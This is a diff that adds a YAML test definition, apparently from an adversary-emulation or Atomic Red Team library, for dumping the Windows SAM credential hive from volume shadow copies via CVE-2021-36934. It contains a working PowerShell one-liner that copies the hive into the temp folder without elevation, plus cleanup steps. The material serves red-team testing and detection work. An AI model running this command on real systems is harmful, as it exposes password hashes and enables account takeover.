@@ -1,0 +1,40 @@
+- id: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+  name: dump volume shadow copy hives with System.IO.File
+  description: Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      psh:
+        command: 1..10 | % {; try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"
+          , "$env:TEMP\SAMvss$_", "true") } catch {}; ls "$env:TEMP\SAMvss$_" -ErrorAction
+          Ignore; }
+        cleanup: 1..#{limit} | % {; rm "$env:TEMP\#{target_hive}vss$_" -ErrorAction
+          Ignore; }
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1003.002
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      target_hive:
+        description: Hive you wish to dump
+        type: string
+        default: SAM
+      limit:
+        description: Limit to the number of shadow copies to iterate through when
+          trying to copy the hive
+        type: integer
+        default: 10
+    technique_created: '2020-02-11T18:42:07.281Z'
+    atomic_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+    import_timestamp: '2025-06-24T11:15:06.154151Z'
